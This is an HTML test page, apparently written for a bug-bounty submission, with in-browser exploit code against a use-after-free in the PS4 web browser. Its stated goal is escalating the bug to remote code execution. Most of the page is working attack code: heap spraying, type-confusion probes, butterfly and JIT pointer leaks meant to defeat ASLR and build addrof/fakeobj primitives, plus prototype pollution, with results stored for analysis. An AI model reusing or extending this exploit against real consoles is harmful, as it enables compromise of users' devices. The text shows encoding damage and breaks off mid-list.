<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - RCE Escalation Tests</title>
</head>
<body>

<h1>PS4 UAF - Escalation to RCE</h1>

<h2>OBJETIVO</h2>
<p style="color:red;font-weight:bold;">ESCALAR UAF PARA REMOTE CODE EXECUTION</p>
<p>Valor atual: $1,000-$2,500 | Valor alvo: $10,000-$12,500</p>

<hr>

<h2>ESTRAT√âGIA 1: JSValue Confusion (addrof/fakeobj)</h2>
<p>Tenta confundir tipos JavaScript para obter primitivas avan√ßadas</p>
<button onclick="runRCE1()">TESTE RCE-1: JSValue Confusion</button>
<div id="rce1"></div>

<script>
function runRCE1() {
    const result = document.getElementById('rce1');
    result.innerHTML = '<h3>RCE-1: JSValue Type Confusion</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    // Criar objetos JS misturados com TypedArrays
    let jsObjects = [];
    for(let i = 0; i < 1000; i++) {
        // Objeto com propriedades espec√≠ficas
        let obj = {
            inline1: 1.1,
            inline2: 2.2,
            inline3: {},  // Ponteiro
            inline4: 4.4
        };
        jsObjects.push(obj);
        
        // TypedArray intercalado
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }
    
    result.innerHTML += '<p>Criados 1000 objetos JS + 1000 TypedArrays intercalados</p>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF trigger...</p>';
        
        // Spray agressivo com objetos JS
        let spray = [];
        for(let i = 0; i < 5000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
            
            // Intercalar com objetos
            if (i % 10 === 0) {
                spray.push({
                    a: 1.1,
                    b: 2.2,
                    c: 3.3
                });
            }
        }
        
        let corrupted = null;
        let corruptedIdx = -1;
        
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                corruptedIdx = i;
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF Confirmado - Testando Type Confusion</h3>';
        
        // Tentar interpretar dados como JSValue
        result.innerHTML += '<h4>Procurando por JSValue pointers:</h4>';
        
        let candidates = [];
        for(let offset = 0; offset < 64; offset++) {
            try {
                const val = corrupted[offset];
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = val;
                const asInt = new BigUint64Array(buf)[0];
                
                // JSValue tagged pointers geralmente t√™m padr√µes espec√≠ficos
                // Bit 0-47: payload, Bit 48-63: tag
                const tag = asInt >> 48n;
                
                // Tags comuns: 0xfffe (object), 0xffff (int), 0x0000 (double)
                if (tag === 0xffen || tag === 0xffffn || tag === 0xfffdn || tag === 0xfffcn) {
                    candidates.push({
                        offset: offset,
                        value: asInt,
                        tag: tag,
                        payload: asInt & 0xffffffffffffn
                    });
                    result.innerHTML += '<p style="color:yellow;">Offset ' + offset + ': Poss√≠vel JSValue! Tag=0x' + tag.toString(16) + ' Payload=0x' + (asInt & 0xffffffffffffn).toString(16) + '</p>';
                }
                
                // Tamb√©m procurar por ponteiros n√£o-tagged (doubles)
                if (asInt > 0x100000000n && asInt < 0x7fffffffffffn && (asInt & 0x7n) === 0n) {
                    candidates.push({
                        offset: offset,
                        value: asInt,
                        type: 'untagged_pointer'
                    });
                    result.innerHTML += '<p style="color:cyan;">Offset ' + offset + ': Ponteiro n√£o-tagged: 0x' + asInt.toString(16) + '</p>';
                }
                
            } catch(e) {}
        }
        
        if (candidates.length > 0) {
            result.innerHTML += '<h3 style="color:green;">CANDIDATOS ENCONTRADOS: ' + candidates.length + '</h3>';
            result.innerHTML += '<pre>' + JSON.stringify(candidates, null, 2) + '</pre>';
            
            // Salvar para an√°lise
            try {
                localStorage.setItem('jsvalue_candidates', JSON.stringify(candidates));
                result.innerHTML += '<p>Dados salvos em localStorage</p>';
            } catch(e) {}
        } else {
            result.innerHTML += '<p>Nenhum candidato a JSValue encontrado</p>';
        }
    };
}
</script>

<hr>

<h2>ESTRAT√âGIA 2: Butterfly Pointer Leak</h2>
<p>Tenta vazar butterfly pointers de objetos JS para calcular endere√ßos</p>
<button onclick="runRCE2()">TESTE RCE-2: Butterfly Leak</button>
<div id="rce2"></div>

<script>
function runRCE2() {
    const result = document.getElementById('rce2');
    result.innerHTML = '<h3>RCE-2: Butterfly Pointer Leak</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    // Arrays regulares (t√™m butterfly)
    let butterflies = [];
    for(let i = 0; i < 2000; i++) {
        let arr = [];
        // Adicionar propriedades para for√ßar butterfly allocation
        for(let j = 0; j < 20; j++) {
            arr[j] = i * 100 + j;
        }
        butterflies.push(arr);
    }
    
    result.innerHTML += '<p>Criados 2000 arrays com butterflies</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        // Criar MAIS arrays durante UAF
        for(let i = 0; i < 1000; i++) {
            let arr = [];
            for(let j = 0; j < 15; j++) {
                arr[j] = 0xBEEF0000 + i;
            }
            butterflies.push(arr);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF Confirmado - Procurando Butterflies</h3>';
        
        // Butterfly pointers geralmente est√£o alinhados em 16 bytes
        let butterflyLeaks = [];
        
        for(let offset = 0; offset < 128; offset++) {
            try {
                const val = corrupted[offset];
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = val;
                const asInt = new BigUint64Array(buf)[0];
                
                // Butterfly: ponteiro alinhado, n√£o-zero, faixa v√°lida
                if (asInt > 0x1000000n && asInt < 0x7fffffffffffn) {
                    const alignment = asInt & 0xfn;
                    if (alignment === 0n || alignment === 8n) {
                        butterflyLeaks.push({
                            offset: offset,
                            pointer: '0x' + asInt.toString(16),
                            alignment: alignment
                        });
                        result.innerHTML += '<p style="color:lime;">Offset ' + offset + ': Butterfly candidate: 0x' + asInt.toString(16) + '</p>';
                    }
                }
            } catch(e) {}
        }
        
        if (butterflyLeaks.length > 0) {
            result.innerHTML += '<h3 style="color:green;">BUTTERFLY POINTERS VAZADOS: ' + butterflyLeaks.length + '</h3>';
            result.innerHTML += '<pre>' + JSON.stringify(butterflyLeaks, null, 2) + '</pre>';
            
            // Se temos butterfly pointer, podemos tentar calcular offsets
            result.innerHTML += '<h4>An√°lise de Padr√µes:</h4>';
            if (butterflyLeaks.length >= 2) {
                const ptr1 = BigInt(butterflyLeaks[0].pointer);
                const ptr2 = BigInt(butterflyLeaks[1].pointer);
                const diff = ptr1 > ptr2 ? ptr1 - ptr2 : ptr2 - ptr1;
                result.innerHTML += '<p>Diferen√ßa entre ponteiros: 0x' + diff.toString(16) + ' (' + diff + ' bytes)</p>';
                result.innerHTML += '<p>Isto pode revelar estrutura do heap!</p>';
            }
            
            try {
                localStorage.setItem('butterfly_leaks', JSON.stringify(butterflyLeaks));
            } catch(e) {}
        } else {
            result.innerHTML += '<p>Nenhum butterfly leak detectado</p>';
        }
    };
}
</script>

<hr>

<h2>ESTRAT√âGIA 3: WebAssembly Memory Leak</h2>
<p>Usa WebAssembly para tentar acessar mem√≥ria nativa</p>
<button onclick="runRCE3()">TESTE RCE-3: WASM Memory</button>
<div id="rce3"></div>

<script>
function runRCE3() {
    const result = document.getElementById('rce3');
    result.innerHTML = '<h3>RCE-3: WebAssembly Memory Access</h3>';
    
    // Verificar se WASM est√° dispon√≠vel
    if (typeof WebAssembly === 'undefined') {
        result.innerHTML += '<p style="color:red;">WebAssembly n√£o dispon√≠vel no PS4</p>';
        return;
    }
    
    result.innerHTML += '<p>WebAssembly dispon√≠vel! Aperte OPTIONS</p>';
    
    // Criar m√≥dulo WASM simples
    const wasmCode = new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, // magic
        0x01, 0x00, 0x00, 0x00, // version
        0x01, 0x07,             // type section
        0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01, 0x7f, // (i32, i32) -> i32
        0x03, 0x02, 0x01, 0x00, // function section
        0x07, 0x07,             // export section
        0x01, 0x03, 0x61, 0x64, 0x64, 0x00, 0x00, // export "add"
        0x0a, 0x09,             // code section
        0x01, 0x07, 0x00,       // function body
        0x20, 0x00, 0x20, 0x01, 0x6a, 0x0b // local.get 0, local.get 1, i32.add, end
    ]);
    
    let wasmModule, wasmInstance, wasmMemory;
    
    try {
        wasmModule = new WebAssembly.Module(wasmCode);
        wasmMemory = new WebAssembly.Memory({initial: 1, maximum: 10});
        wasmInstance = new WebAssembly.Instance(wasmModule, {});
        result.innerHTML += '<p>WASM module criado com sucesso!</p>';
    } catch(e) {
        result.innerHTML += '<p>Erro ao criar WASM: ' + e.message + '</p>';
        return;
    }
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF trigger...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF + WASM Memory Test</h3>';
        
        // Tentar criar ArrayBuffer compartilhado com WASM
        const memBuffer = wasmMemory.buffer;
        const memView = new Uint8Array(memBuffer);
        
        result.innerHTML += '<p>WASM Memory size: ' + memBuffer.byteLength + ' bytes</p>';
        
        // Escrever padr√£o no WASM memory
        for(let i = 0; i < 256; i++) {
            memView[i] = i & 0xFF;
        }
        
        // Procurar este padr√£o no array corrompido
        result.innerHTML += '<h4>Procurando padr√£o WASM no array corrompido:</h4>';
        
        let found = false;
        for(let offset = 0; offset < 64; offset++) {
            try {
                const val = corrupted[offset];
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = val;
                const bytes = new Uint8Array(buf);
                
                // Verificar se cont√©m sequ√™ncia 0x00, 0x01, 0x02, 0x03...
                let isPattern = true;
                for(let i = 0; i < 4; i++) {
                    if (bytes[i] !== i) {
                        isPattern = false;
                        break;
                    }
                }
                
                if (isPattern) {
                    result.innerHTML += '<p style="color:red;">WASM PATTERN ENCONTRADO no offset ' + offset + '!</p>';
                    found = true;
                }
            } catch(e) {}
        }
        
        if (!found) {
            result.innerHTML += '<p>Padr√£o WASM n√£o encontrado (esperado - pools separados)</p>';
        }
        
        // Tentar vazar endere√ßo do WASM memory buffer
        result.innerHTML += '<h4>Tentando vazar endere√ßo do WASM buffer:</h4>';
        
        // ArrayBuffer backing store pointer
        try {
            const memPtr = 0; // Placeholder - tentar√≠amos vazar isto
            result.innerHTML += '<p>Backing store do WASM memory em: (n√£o acess√≠vel diretamente)</p>';
        } catch(e) {}
    };
}
</script>

<hr>

<h2>ESTRAT√âGIA 4: Array Prototype Chain Manipulation</h2>
<p>Tenta modificar prototype chain para ganhar controle</p>
<button onclick="runRCE4()">TESTE RCE-4: Prototype Pollution</button>
<div id="rce4"></div>

<script>
function runRCE4() {
    const result = document.getElementById('rce4');
    result.innerHTML = '<h3>RCE-4: Prototype Chain Manipulation</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    // Salvar prototypes originais
    const originalArrayProto = Array.prototype;
    const originalObjectProto = Object.prototype;
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    // Criar objetos com prototype customizado
    let protoObjects = [];
    for(let i = 0; i < 1000; i++) {
        let obj = Object.create(null);
        obj.id = i;
        obj.value = 0xDEAD0000 + i;
        protoObjects.push(obj);
    }
    
    result.innerHTML += '<p>Objetos com prototype customizado criados</p>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        let corruptedIdx = -1;
        
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                corruptedIdx = i;
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF Confirmado - Testando Prototype Manipulation</h3>';
        
        // Tentar corromper prototype
        result.innerHTML += '<h4>Tentativa 1: Modificar Array.prototype via corrupted:</h4>';
        try {
            // Tentar injetar propriedade maliciosa
            const fakeProto = corrupted[0];
            result.innerHTML += '<p>Valor em corrupted[0]: ' + fakeProto + '</p>';
            
            // Se pud√©ssemos interpretar como objeto...
            // Array.prototype = corrupted; // Isto n√£o funciona diretamente
            
        } catch(e) {
            result.innerHTML += '<p>Erro: ' + e.message + '</p>';
        }
        
        // Tentar poluir prototype chain
        result.innerHTML += '<h4>Tentativa 2: Prototype Pollution:</h4>';
        try {
            // Adicionar propriedade ao prototype
            Array.prototype.malicious = corrupted;
            
            // Verificar se propagou
            const testArr = [];
            if (testArr.malicious) {
                result.innerHTML += '<p style="color:green;">Prototype pollution funcionou!</p>';
                result.innerHTML += '<p>testArr.malicious existe: ' + testArr.malicious + '</p>';
            }
        } catch(e) {
            result.innerHTML += '<p>Erro: ' + e.message + '</p>';
        }
        
        // Procurar por structure IDs
        result.innerHTML += '<h4>Procurando por Structure IDs:</h4>';
        for(let offset = 0; offset < 32; offset++) {
            try {
                const val = corrupted[offset];
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = val;
                const asInt = new BigUint64Array(buf)[0];
                
                // Structure IDs s√£o geralmente pequenos inteiros
                if (asInt > 0n && asInt < 0x10000n) {
                    result.innerHTML += '<p>Offset ' + offset + ': Poss√≠vel Structure ID: 0x' + asInt.toString(16) + '</p>';
                }
            } catch(e) {}
        }
    };
}
</script>

<hr>

<h2>ESTRAT√âGIA 5: JIT Spray + UAF</h2>
<p>Combina JIT compilation com UAF para tentar ROP</p>
<button onclick="runRCE5()">TESTE RCE-5: JIT Spray</button>
<div id="rce5"></div>

<script>
function runRCE5() {
    const result = document.getElementById('rce5');
    result.innerHTML = '<h3>RCE-5: JIT Spray Technique</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    // Criar fun√ß√µes para triggerar JIT
    let jitFunctions = [];
    
    result.innerHTML += '<p>Criando fun√ß√µes para JIT compilation...</p>';
    
    for(let i = 0; i < 100; i++) {
        // Fun√ß√£o que ser√° JIT compiled
        const func = new Function('x', 'y', `
            let sum = 0;
            for(let j = 0; j < 100; j++) {
                sum += x + y + j + ${i};
            }
            return sum * 0x41414141;
        `);
        
        // Executar m√∫ltiplas vezes para triggerar JIT
        for(let j = 0; j < 1000; j++) {
            func(j, j*2);
        }
        
        jitFunctions.push(func);
    }
    
    result.innerHTML += '<p>JIT functions criadas e aquecidas</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF + JIT Code Search</h3>';
        
        // Procurar por poss√≠veis ponteiros de c√≥digo JIT
        result.innerHTML += '<h4>Procurando por ponteiros de c√≥digo JIT:</h4>';
        
        let jitCandidates = [];
        
        for(let offset = 0; offset < 64; offset++) {
            try {
                const val = corrupted[offset];
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = val;
                const asInt = new BigUint64Array(buf)[0];
                
                // C√≥digo JIT geralmente est√° em ranges espec√≠ficos
                // Ex: 0x100000000 - 0x200000000 em alguns sistemas
                if (asInt > 0x10000000n && asInt < 0x7f0000000000n) {
                    const alignment = asInt & 0xfn;
                    // C√≥digo geralmente alinhado em 16 bytes
                    if (alignment === 0n) {
                        jitCandidates.push({
                            offset: offset,
                            pointer: '0x' + asInt.toString(16)
                        });
                        result.innerHTML += '<p style="color:orange;">Offset ' + offset + ': JIT code candidate: 0x' + asInt.toString(16) + '</p>';
                    }
                }
                
                // Tamb√©m procurar por 0x41414141 (nosso marcador nas fun√ß√µes)
                if ((asInt & 0xffffffffn) === 0x41414141n) {
                    result.innerHTML += '<p style="color:red;">MARCADOR JIT ENCONTRADO no offset ' + offset + '!</p>';
                    jitCandidates.push({
                        offset: offset,
                        value: asInt,
                        type: 'marker'
                    });
                }
            } catch(e) {}
        }
        
        if (jitCandidates.length > 0) {
            result.innerHTML += '<h3 style="color:green;">JIT CANDIDATES: ' + jitCandidates.length + '</h3>';
            result.innerHTML += '<pre>' + JSON.stringify(jitCandidates, null, 2) + '</pre>';
            
            try {
                localStorage.setItem('jit_candidates', JSON.stringify(jitCandidates));
            } catch(e) {}
        } else {
            result.innerHTML += '<p>Nenhum candidato JIT encontrado</p>';
        }
        
        // Tentar executar fun√ß√£o via ponteiro corrompido
        result.innerHTML += '<h4>Tentando hijack function pointer:</h4>';
        try {
            // Se tiv√©ssemos um ponteiro de fun√ß√£o...
            // Isto √© onde usar√≠amos fakeobj() se tiv√©ssemos
            result.innerHTML += '<p>Sem primitiva fakeobj - n√£o √© poss√≠vel hijack direto</p>';
        } catch(e) {}
    };
}
</script>

<hr>

<h2>RECUPERAR DADOS DOS TESTES</h2>
<button onclick="showAllLeaks()">MOSTRAR TODOS OS LEAKS ENCONTRADOS</button>
<div id="all-leaks"></div>

<script>
function showAllLeaks() {
    const div = document.getElementById('all-leaks');
    div.innerHTML = '<h3>An√°lise Completa de Todos os Testes</h3>';
    
    const tests = [
        'jsvalue_candidates',
        'butterfly_leaks',
        'jit_candidates'
    ];
    
    let foundAny = false;
    
    tests.forEach(testName => {
        const data = localStorage.getItem(testName);
        if (data) {
            foundAny = true;
            div.innerHTML += '<h4>' + testName + ':</h4>';
            const parsed = JSON.parse(data);
            div.innerHTML += '<pre>' + JSON.stringify(parsed, null, 2) + '</pre>';
            
            // An√°lise espec√≠fica
            if (testName === 'butterfly_leaks' && parsed.length > 0) {
                div.innerHTML += '<p style="color:green;font-weight:bold;">üéØ BUTTERFLY LEAKS S√ÉO CR√çTICOS!</p>';
                div.innerHTML += '<p>Com butterfly pointers voc√™ pode:</p>';
                div.innerHTML += '<ul>';
                div.innerHTML += '<li>Calcular offsets de objetos</li>';
                div.innerHTML += '<li>Derrotar ASLR parcialmente</li>';
                div.innerHTML += '<li>Construir addrof() primitivo</li>';
                div.innerHTML += '</ul>';
            }
            
            if (testName === 'jsvalue_candidates' && parsed.length > 0) {
                div.innerHTML += '<p style="color:green;font-weight:bold;">üéØ JSVALUE TAGS ENCONTRADOS!</p>';
                div.innerHTML += '<p>Tags indicam tipo de objeto - podem ajudar a construir fakeobj()</p>';
            }
        }
    });
    
    if (!foundAny) {
        div.innerHTML += '<p>Nenhum dado salvo. Execute os testes RCE-1 a RCE-5 primeiro.</p>';
    }
}
</script>

<hr>

<h2>INSTRU√á√ïES PARA AN√ÅLISE</h2>
<ol>
<li>Execute TODOS os testes RCE-1 a RCE-5</li>
<li>Para cada teste: Clique no bot√£o ‚Üí Aperte OPTIONS ‚Üí Aguarde resultado</li>
<li>Ap√≥s executar todos, clique em "MOSTRAR TODOS OS LEAKS"</li>
<li>Analise os resultados e envie para o analista da Sony</li>
</ol>

<h3>O Que Procurar:</h3>
<ul>
<li><b>Butterfly Leaks:</b> Ponteiros alinhados
